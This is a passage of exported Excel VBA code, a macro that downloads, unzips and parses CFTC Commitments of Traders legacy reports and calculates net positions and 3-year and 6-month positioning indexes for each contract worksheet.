Attribute VB_Customizable = True
Attribute VB_Name = "Sheet19"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet2"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet20"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet21"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet22"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet23"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet24"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet25"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet26"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet27"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet28"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet3"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet39"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet4"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet40"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet42"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet45"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet46"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet48"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet52"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet54"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet56"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet57"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet59"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet6"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet61"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet63"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet64"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet65"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet66"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet67"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet68"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet69"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet70"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet71"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet72"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet74"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet84"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet85"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet86"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet87"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet88"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet89"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet90"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sorting_Macro_Legacy"
Option Explicit

Public WK As Worksheet
Public All_Contracts As Dictionary
Public Query_Range() As Variant
Public HUB_Name As Variant
Const TypeF As String = "L"
Sub Sort_And_Calculate()
Attribute Sort_And_Calculate.VB_Description = "Sorting Macro"
Attribute Sort_And_Calculate.VB_ProcData.VB_Invoke_Func = " \n14"

With Application
    .ScreenUpdating = False
    .Calculation = xlCalculationManual
    .DisplayStatusBar = False
    .EnableEvents = False
    
    HUB_Name = .Run("'" & ThisWorkbook.Name & "'!Get_Worksheet_Info")  'update.Sheet Data list & supply array
    
End With

Dim c As Long, Refresh_Time As Double, TI As Double, CN As Long, Last_Update As Long, _
WS_Data() As Variant, Array_Complete() As Variant, Test_Mode As Boolean, _
Variable_Range As Range, Weekly_Dict As New Dictionary

Const YearIxThree As Long = 156, MonthIxSix As Long = 26
    
'====Progress Bar variables==============================================================================================
Dim Progress_CHK As CheckBox, Progress_Control As MSForms.Label, Bar_Increment As Double, Percent_Mod As Long
'========================================================================================================================
TI = Timer

Set Variable_Range = Variable_Sheet.ListObjects("Saved_Variables").DataBodyRange.Columns(2)

With Variable_Range
    Last_Update = .Rows(1).Value2 ' the date the data was last sorted for
             CN = .Rows(2).Value2  'commercial column
End With

#If Mac Then

    On Error GoTo MAC_No_PQuery
    
    Query_Range = Web_Query_MAC
    
    On Error GoTo 0
    
#Else

    If Weekly.T.Value = True Then Test_Mode = True
  
    Refresh_Time = Timer
    
    If Application.Version <= 12# Or Test_Mode Then 'IF EXCEL VERSION IS <= EXCEL 2007 OR Test_Mode = True
    
Text_Parse: On Error GoTo 0
        
        Call Weekly_2007_Dictionary(Weekly_Dict)
        
        Query_Range = Historical_Parse(Weekly_Dict, "Weekly", TypeF, After_This_Date:=Last_Update)  'send to function
        Weekly_Dict.RemoveAll
        
    Else
    
        On Error GoTo No_Power_Query    'Error handler for if an error occured while refreshing the Query
        Call Refresh                    'refresh Weekly Tab
        Query_Range = Weekly.ListObjects("Weekly").DataBodyRange.Value2 'add contents of table to array
        On Error GoTo 0
    
    End If
    
    Debug.Print "Weekly Data for [" & Split(ThisWorkbook.Name, ".")(0) & "] refreshed in " & Round(Timer - Refresh_Time, 2) & " seconds"

#End If

Update_Text CLng(Query_Range(1, 1))

ReDim Preserve Query_Range(1 To UBound(Query_Range, 1), 1 To CN + 19) 'expand to match size of calculations

If Query_Range(1, 1) - Last_Update > 13 Then 'Compares dates and if more than 13 days different then data will be downloaded
    'Queried data will always be the latest
    #If Mac Then
    
        GoTo MAC_Multi_Week_Miss
        
    #Else
    
        Query_Range = Missing_Data(Query_Range, Last_Update)  'Will download missing data and overwrite Array
        
        'HUB_ContractC = Application.Index(HUB_Name, 0, 1) 'Contract Codes from the above array
        
        Call Block_Query(Query_Range, CN, Application.Index(HUB_Name, 0, 1), YearIxThree, MonthIxSix)
        
        'Erase HUB_ContractC
        
        GoTo Clean_Up
        
    #End If
    
ElseIf Query_Range(1, 1) = Last_Update And Test_Mode = False Then 'Will prevent user from running this SUB if Last_Update is equivalent to the column on the "Weekly" Tab that contains the date for currently Queried data

    MsgBox "Data has already been sorted." & vbNewLine & vbNewLine & _
    "If you would still like to proceed, then please set Test_Mode to True." & _
    "|Otherwise, try again after new data has been released|"
       
    GoTo Erase_Objects

End If

'Progress Bar====================================================================================================
Set Progress_CHK = Weekly.Shapes("Progress_CHKBX").OLEFormat.Object

If Progress_CHK.Value = 1 Then 'Show Progress Bar if Toggled on
    With Progress_Bar
    
        .Show
        
        Set Progress_Control = .Bar                            'The colored Bar
        Bar_Increment = .Frame.Width / UBound(Query_Range, 1)  'How much to increment the bar EACH loop
        Percent_Mod = UBound(Query_Range, 1) * 0.05            'Update when the loop# is a factor of this variable
    
    End With
End If
'============================= The Weekly Loop ============================================================================
For c = 1 To UBound(Query_Range, 1) 'Loop rows of the Queried Data

    Set WK = ThisWorkbook.Worksheets(WorksheetFunction.VLookup(Query_Range(c, CN - 2), HUB_Name, 2, False))
    
    WS_Data = CFTC_Table(ThisWorkbook, WK).DataBodyRange.Value2
    
    If UBound(WS_Data, 2) > UBound(Query_Range, 2) Then ReDim Preserve WS_Data(1 To UBound(WS_Data, 1), 1 To UBound(Query_Range, 2))
    
    With Weekly_Dict
        
        .Add "Old", WS_Data 'Previous Worksheet Data[] |ORDER OF ADDITION IS IMPORTANT|
        
        .Add "Latest", Application.Index(Query_Range, c, 0) 'Current row from Query_Range

        Array_Complete = Multi_Calculations(Multi_Week_Addition(Weekly_Dict, 1), 1, CN, _
                                            YearIxThree, MonthIxSix, False) 'above line returns a 1D array
        Call Paste_To_Range(WK, Array_Complete, WS_Data) 'Paste to bottom of table
        
        Erase WS_Data       'Memory Clean
        Erase Array_Complete
        Set WK = Nothing
        
        .RemoveAll
        
    End With

    If Not Progress_Control Is Nothing Then
        If c Mod Percent_Mod = 0 Then Increment_Progress Label:=Progress_Control, New_Width:=c * Bar_Increment, Loop_Percentage:=c / UBound(Query_Range, 1)
    End If
    
Next c

If Not Progress_Control Is Nothing Then
    Unload Progress_Bar
    Set Progress_Control = Nothing
End If

Variable_Range.Rows(1).Value2 = Query_Range(1, 1) 'Update Last updated date VARIABLE

Debug.Print Split(ThisWorkbook.Name, ".")(0) & " Sorting Macro completed in " & Round(Timer - TI, 2) & " seconds. " & Now

Clean_Up:

    HUB.Activate
    Courtesy

Erase_Objects:

    Re_Enable 'Do this regardless of if data parse was successful or not

'Cleaning Memory------------------------------------------------------------------------------------------------
    Erase Query_Range
    Erase HUB_Name
    Set All_Contracts = Nothing
    Set Variable_Range = Nothing
    Set Weekly_Dict = Nothing
    Set Progress_CHK = Nothing
'==============================================================================================================
Exit Sub

#If Mac Then
#Else
No_Power_Query:

    Err.Clear
    Resume Text_Parse
    
#End If

MAC_No_PQuery:
    
    MsgBox "Power Query installation for Excel is mandatory while on the MAC Operating System." & vbNewLine & _
    "Please download it if it's available to your version of Excel."
    
    Resume Erase_Objects
    
MAC_Multi_Week_Miss:

    MsgBox "MultiWeek Historical download is currently unavailable to the MAC Operating System." & vbNewLine & _
    "If you would like to request this feature, please send an email to MoshiM_UC@outlook.com"
    
    GoTo Erase_Objects
    
End Sub
Private Function Missing_Data(Data, DateO As Long) As Variant  'Should change to function; Block will find the amount of missed time and download appropriate files

Dim URL As String, Y(1 To 4) As Long, X As Long, File_Dictionary As New Dictionary, WorkbookName_X As String, FileN As String, T As String

WorkbookName_X = Split(ThisWorkbook.Name, ".")(0) 'EX: "Legacy"

Const File_Within_Zip As String = "annualof.xls", Partial_Url As String = "https://www.cftc.gov/files/dea/history/dea_com_xls_"

Y(1) = DateO      'Y(1) is the week the data was last sorted for
Y(2) = Data(1, 1) 'Y(2) is the date of the Queried data
Y(3) = Year(Y(1)) 'Y(3) is year the data was last sorted for
Y(4) = Year(Y(2)) 'Y(4) is the year of the Queried data

X = 1

Application.DisplayAlerts = False
    
With File_Dictionary

    Do While Y(3) <= Y(4) 'While oldest year is less than or equal to current year of refreshed data
            
        Select Case Y(3)
        
            Case Y(4) 'year the latest data has ben queried for. Place date of Queried data in the file name
               
                FileN = Environ("TEMP") & "\" & Y(2) & "_" & WorkbookName_X & "_" & Y(3) & "_MoshiM.xls" 'File path for the XLS
            
            Case Else
            
                FileN = Environ("TEMP") & "\" & WorkbookName_X & "_" & Y(3) & "_MoshiM.xls" 'File path for the XLS
        
        End Select
        
        If Dir(FileN) = vbNullString Then 'if the excel file isn't found then download it andd add to the dictionary
            
            T = CStr(X)
            
            URL = Partial_Url & Y(3) & ".zip" ' URL for Yearly ZIP files. Start with oldest
        
            .Add T, Replace(FileN, ".xls", ".zip") 'replace .xls with .zip and store string in Dictionary
            
            Call Get_File(URL, .Item(T))   'Download the zip file for that year

            If Dir(Environ("TEMP") & "\" & File_Within_Zip) <> vbNullString Then  'if annualof.xls exists then kill it

                Kill Environ("TEMP") & "\" & File_Within_Zip

            End If

            Call entUnZip1File(.Item(T), Environ("TEMP"), File_Within_Zip) 'Extract specified file from Zip file

            .Item(T) = FileN 'replace Dictionary item ".zip" string with ".xls" version
        
            Name Environ("TEMP") & "\" & File_Within_Zip As .Item(T) 'Rename the extracted file
            
        Else 'add file path to dictionary
        
            .Add T, FileN
            
        End If
        
        X = X + 1
        
        Y(3) = Y(3) + 1 'increment year loop

    Loop

End With

Application.DisplayAlerts = True

Missing_Data = Historical_Parse(File_Dictionary, "Yearly", TypeF, After_This_Date:=DateO)
    
End Function
Private Sub Update_Text(X As Long)

Dim AN1 As String, WSA() As Variant

WSA = Array(Weekly, HUB)

AN1 = "[v] " & MonthName(Month(X)) & " " & Day(X) & ", " & Year(X)

For X = LBound(WSA) To UBound(WSA)

    WSA(X).Shapes("My_Date").TextFrame.Characters.Text = AN1

Next X

Erase WSA

End Sub
Private Function Multi_Calculations(AR1, Weeks_Missed As Long, CommercialC As Long, Time1 As Long, Time2 As Long, Optional Missing_Several_Weeks As Boolean = False) As Variant
    
Dim X As Long, Y As Long, N As Long, Start As Long, Finish As Long, INTE_B() As Long, Intermediate_F() As Variant, Z As Long

'Dim GG As Double
'GG = Timer

If Missing_Several_Weeks = True Then

    Start = UBound(AR1, 1) - (Weeks_Missed - 1) '-1 to incorpotate all missed weeks

Else

    Start = UBound(AR1, 1) 'Last row of the supplied array

End If

Finish = UBound(AR1, 1)

    'Time1 is Year3,Time2 is Month6

    For X = Start To Finish

        AR1(X, CommercialC) = AR1(X, 7) - AR1(X, 8)                                 'Commercial Net

        AR1(X, CommercialC + 1) = AR1(X, 4) - AR1(X, 5)                             'Non-Commercial Net

        AR1(X, CommercialC + 2) = AR1(X, 11) - AR1(X, 12)                           'Non-Reportable

        AR1(X, CommercialC + 9) = AR1(X, CommercialC) / (AR1(X, 3) - AR1(X, 6))     'Commercial/OI

        If AR1(X, 4) > 0 Or AR1(X, 5) > 0 Then

            AR1(X, CommercialC + 13) = AR1(X, 4) / (AR1(X, 4) + AR1(X, 5))      'NC Long%

            AR1(X, CommercialC + 14) = 1 - AR1(X, CommercialC + 13)             'NC Short%

        End If

        If X >= 2 Then

            AR1(X, CommercialC + 15) = AR1(X, CommercialC) - AR1(X - 1, CommercialC) 'Commercial Net Change

            For Y = 7 To 8  'Commercial Gross Long % Change & Commercial Gross Short % Change

                If AR1(X - 1, Y) > 0 Then
    
                    AR1(X, CommercialC + 9 + Y) = (AR1(X, Y) - AR1(X - 1, Y)) / AR1(X - 1, Y)
                    
                End If

            Next Y

        End If

        If AR1(X, 7) > 0 Or AR1(X, 8) > 0 Then

            AR1(X, CommercialC + 18) = AR1(X, 7) / (AR1(X, 7) + AR1(X, 8))                  'Commercial Long %

            AR1(X, CommercialC + 19) = 1 - AR1(X, CommercialC + 18)                         'Commercial Short %

        End If

    Next X
    
    If UBound(AR1, 1) > Time1 Then '3Y index
        
        For Y = 0 To 3
        
            INTE_B = Multi_IRecal(CommercialC + Array(0, 2, 9, 1)(Y), Time1, AR1, Weeks_Missed)
            
            N = Array(3, 5, 11, 4)(Y) + CommercialC         'used to calculate column number
            Z = 1 'finish-x
            For X = Start To Finish
                AR1(X, N) = INTE_B(Z)                       '[0]Commercial index 3Y  [1]Non-Reportable 3Y   < values of Y
                Z = Z + 1                                   '[2] Willco3Y            [3] Non-Commerical 3Y
            Next X
            
            Erase INTE_B
            
        Next Y

    End If

    If UBound(AR1, 1) > Time2 Then '6M index
        
        For Y = 0 To 3
            
            INTE_B = Multi_IRecal(CommercialC + Array(0, 2, 9, 1)(Y), Time2, AR1, Weeks_Missed)
            
            N = Array(6, 8, 10, 7)(Y) + CommercialC ' used to calculate column number
            Z = 1
            For X = Start To Finish
                AR1(X, N) = INTE_B(Z)   '[0]Commerical 6M [1]Non-Reportable 6M
                Z = Z + 1               '[2]WillCo6M      [3]Non Commercial 6M
            Next X
            
            Erase INTE_B
            
        Next Y

    End If
    
    N = CommercialC + 11 'Willco 3Y Column
    Y = N + 1            'movement index column

    For X = Start To Finish 'First Missed to most recent do Movement Index Calculations

        If X > Time1 + 6 Then

            AR1(X, Y) = AR1(X, N) - AR1(X - 6, N)
    
        End If

    Next X

    'The below code block is for adding only the missing data to an Array called Intermediate_F
    N = 1

    ReDim Intermediate_F(1 To Weeks_Missed, 1 To UBound(AR1, 2))

    For X = Start To Finish 'populate each row sequentially

        For Y = 1 To UBound(AR1, 2)

            Intermediate_F(N, Y) = AR1(X, Y)

        Next Y

        N = N + 1

    Next X

    Multi_Calculations = Intermediate_F
    
'Debug.Print "Time to calculate " & Timer - GG

End Function
Private Function Multi_IRecal(Column_Number_Reference As Long, Time_Period As Long, Arr As Variant, Optional Missing_Weeks As Long = 1) As Variant

Dim Array_Column() As Double, X As Long, I As Long, Array_Period() As Variant, Current_Row As Long, Array_Final() As Long, _
UB As Long, Initial As Long

UB = UBound(Arr, 1) 'number of rows in the supplied array[Upper bound in 1st dimension]

ReDim Array_Period(1 To Time_Period) 'Temporary Array that will hold the look back period
ReDim Array_Final(1 To Missing_Weeks) 'Array that will hold calculated values
ReDim Array_Column(1 To UB) 'Array that stores all data in the column

If Missing_Weeks = 1 Then 'if only doing calculations for a single week's worth of data

    Initial = UB 'start at the bottom of the supplied array
    
Else 'start at the beginning of the missing data weeks block

    Initial = UB - (Missing_Weeks - 1)

End If

For I = 1 To UB 'adds an entire column to an array but can be switched with a variable

    Array_Column(I) = Arr(I, Column_Number_Reference) ' Places Refrence Column inside first column of array

Next I
   
With WorksheetFunction

    For Current_Row = Initial To UB
    
        If Current_Row > Time_Period Then 'only calculate if there is enough data
        
            For X = 1 To Time_Period  'Fill the temporary array starting at variable Current Row with the previous Time_Period number of values

                Array_Period(X) = Array_Column(Current_Row - X)

            Next X
            
            'Array_Period now has the last Time_Period number of values
            
            Array_Final(Missing_Weeks - (UB - Current_Row)) = ((Array_Column(Current_Row) - .Min(Array_Period)) / (.Max(Array_Period) - .Min(Array_Period))) * 100
                        'ex: 2-(480-479)=1                      'Stochastic calculation
        End If
    
    Next Current_Row
    
End With

Multi_IRecal = Array_Final

End Function
Private Sub Block_Query(Query, DL_Reference As Long, Codes, Time1 As Long, Time2 As Long)

Dim X As Long, Item As Variant, Contract_Block_Count As Long, c As Long, ROW_IT As Long, W As Long, H As Long, D As Long, _
R As Long, WS_Data() As Variant, Array_Complete() As Variant, Block() As Variant, Contract_Block_Set As String, _
Code_Column As Long

ReDim Preserve Query(1 To UBound(Query, 1), 1 To DL_Reference + 19)

Code_Column = DL_Reference - 2
'=======================================================================================================================
'Progress Bar variables
Dim Progress_CHK As CheckBox, Bar_Increment As Double, Progress_Control As MSForms.Label, Percent_Mod As Long

 Set Progress_CHK = Weekly.Shapes("Progress_CHKBX").OLEFormat.Object

If Progress_CHK.Value = 1 Then 'Show Progress Bar if Toggled on

    With Progress_Bar
        .Show
        Set Progress_Control = .Bar                            'The colored Bar
        Bar_Increment = .Frame.Width / UBound(Codes, 1)  'How much to increment the bar EACH loop when conditions are met
        Percent_Mod = UBound(Codes, 1) * 0.01            'Update when the loop# is a factor of this variable
    End With

End If
'========================================================================================================================
For c = 1 To UBound(Codes, 1) 'This loop will group contracts with the same contract code into a single array
    
    With WorksheetFunction
        Contract_Block_Count = UBound(Filter(.Transpose(.Index(Query, 0, Code_Column)), Codes(c, 1), True)) + 1
    End With
    
    If Contract_Block_Count > 0 Then ' GoTo Skip_This_Block

        ROW_IT = 1

        ReDim Block(1 To Contract_Block_Count, 1 To UBound(Query, 2))

        For X = 1 To UBound(Query, 1)  'Iterate each line of the Array
            
            Contract_Block_Set = Query(X, Code_Column) 'Contract code to match
            
            If Contract_Block_Set = Codes(c, 1) Then 'IF current contract code is equal to the specified code in the Codes array

                For W = 1 To UBound(Block, 2) 'iterate columns

                    Block(ROW_IT, W) = Query(X, W) 'and add the contents to the Contract Code block of value

                Next W

                ROW_IT = ROW_IT + 1

            End If

        Next X
                    
        Set WK = ThisWorkbook.Worksheets(WorksheetFunction.VLookup(Codes(c, 1), HUB_Name, 2, False)) 'Adds worksheet names to the array
        
        WS_Data = CFTC_Table(ThisWorkbook, WK).DataBodyRange.Value2
        
        If UBound(WS_Data, 2) > UBound(Query, 2) Then ReDim Preserve WS_Data(1 To UBound(WS_Data, 1), 1 To UBound(Query, 2))
                
        With All_Contracts
            .RemoveAll
            .Add "Old", WS_Data
            All_Contracts.Add "Block", Block
        End With
         
        Array_Complete = Multi_Week_Addition(All_Contracts, 1) 'adds the contents of the NEW array TO the contents of the OLD

        Block = Multi_Calculations(Array_Complete, UBound(Block, 1), DL_Reference, Time1, Time2, True)

        Call Paste_To_Range(WK, Block, WS_Data)
        
        Erase Block: Erase WS_Data: Erase Array_Complete
    
    End If
    
    If Not Progress_Control Is Nothing Then
        If c Mod Percent_Mod = 0 Then Increment_Progress Label:=Progress_Control, New_Width:=c * Bar_Increment, Loop_Percentage:=c / UBound(Codes, 1)
    End If
    
Next c

If Not Progress_Control Is Nothing Then
    Unload Progress_Bar
